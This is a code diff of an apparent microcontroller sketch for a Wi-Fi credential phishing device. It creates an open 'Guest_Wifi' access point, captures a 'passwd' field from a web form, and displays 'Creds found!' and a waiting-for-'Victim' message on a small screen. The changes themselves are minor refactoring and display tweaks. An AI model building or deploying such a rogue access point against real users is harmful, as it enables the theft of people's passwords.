@@ -93,7 +93,7 @@ void handleRoot() {
 void handleForm() {
  String passwd = server.arg("passwd");
  display.clear(); 
- display.drawXbm(4,0,128,64,attack_bits);
+ display.drawXbm(4,0,128,64,high_signal_bits);
  display.drawLine(0, 54, 128, 54);
  display.drawLine(0, 53, 128, 53);
  display.drawString(0,10,"Creds found!"); 
@@ -106,8 +106,11 @@ void handleForm() {
 }
 //SETUP
 void setup(void){
+  
   Serial.begin(9600);
     // add to menu interface init
+  const char *ssid = "Guest_Wifi";
+  const char *password = NULL;  
   display.init();
   display.flipScreenVertically();
   display.setTextAlignment(TEXT_ALIGN_LEFT);
@@ -118,7 +121,7 @@ void setup(void){
   display.clear(); display.display();
   display.drawString(0,10,"Waitng for");
   display.drawString(0,20,"Victim on");
-  display.drawString(0,30,"Address IP:");
+  display.drawString(0,30,ssid);
   display.drawString(0,40,ipString);
   
   display.drawXbm(0,0,128,64,invader_attack_bits);
@@ -129,8 +132,7 @@ void setup(void){
   WiFi.mode(WIFI_AP);
 
   WiFi.softAPConfig(apIP, apIP , IPAddress(255, 255, 255, 0));
-  const char *ssid = "Guest_Wifi";
-  const char *password = NULL;
+
   WiFi.softAP(ssid, password);  
   Serial.println("");
 
